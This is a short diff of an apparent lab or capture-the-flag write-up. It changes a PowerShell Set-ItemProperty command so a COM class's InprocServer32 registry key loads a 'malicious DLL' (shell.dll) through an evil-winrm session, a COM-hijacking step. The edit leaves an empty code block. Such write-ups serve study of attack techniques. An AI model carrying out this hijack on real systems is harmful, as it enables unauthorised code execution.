@@ -546,10 +546,15 @@ evil-winrm-py PS C:\Temp>
 Then ill give all users full control over the file so `ee.reed` can use the file
 
 ```python
--Name "(default)" -Value "C:\programdata\rev.dll"
+PS C:\Temp> Set-ItemProperty "Registry::HKEY_CLASSES_ROOT\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" -Name "(default)" -Value "C:\Temp\shell.dll"
+PS C:\Temp> 
 ```
 
+Ill then set the value to my malicious DLL
 
+```python
+
+```
 
 
 
